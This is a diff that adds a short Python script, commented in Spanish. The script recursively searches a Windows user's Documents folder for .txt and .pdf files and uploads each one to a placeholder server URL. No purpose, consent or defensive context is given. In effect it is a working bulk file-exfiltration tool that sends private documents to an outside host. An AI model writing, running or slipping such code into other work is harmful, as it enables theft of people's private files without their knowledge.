@@ -1,0 +1,27 @@
+import os
+import requests
+
+# Configuración
+directorio_busqueda = 'C:\\Users\\usuario\\Documents'  # Ajusta a tu directorio objetivo
+extensiones = ['.txt', '.pdf']  # Ajusta las extensiones de archivos deseadas
+url_servidor = 'http://tu_servidor.com/upload'  # URL del servidor donde se cargarán los archivos
+
+def buscar_y_cargar_archivos(directorio, extensiones):
+    for raiz, _, archivos in os.walk(directorio):
+        for archivo in archivos:
+            if any(archivo.endswith(ext) for ext in extensiones):
+                ruta_completa = os.path.join(raiz, archivo)
+                print(f"Encontrado: {ruta_completa}")
+                with open(ruta_completa, 'rb') as f:
+                    files = {'file': (archivo, f)}
+                    try:
+                        r = requests.post(url_servidor, files=files)
+                        if r.status_code == 200:
+                            print(f"Éxito al cargar: {archivo}")
+                        else:
+                            print(f"Error al cargar: {archivo}")
+                    except Exception as e:
+                        print(f"Excepción al cargar: {archivo}, Error: {e}")
+
+# Ejecutar la función
+buscar_y_cargar_archivos(directorio_busqueda, extensiones)
